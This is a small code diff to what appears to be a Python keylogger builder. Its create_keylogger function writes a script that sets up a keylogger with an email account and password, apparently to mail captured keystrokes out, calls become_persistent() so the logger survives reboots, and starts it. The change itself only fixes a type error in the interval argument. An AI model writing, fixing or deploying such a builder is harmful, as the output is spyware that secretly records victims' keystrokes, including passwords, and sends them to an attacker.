@@ -22,7 +22,7 @@ def get_arguments():
 def create_keylogger(file_name, interval, email, password):
     with open(file_name, "w+") as file:
         file.write("import keylogger\n")
-        file.write("zlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
+        file.write("zlogger = keylogger.Keylogger(" + str(interval) + ",'" + email + "','" + password + "')\n")
         file.write("zlogger.become_persistent()\n")
         file.write("zlogger.start()\n")
 
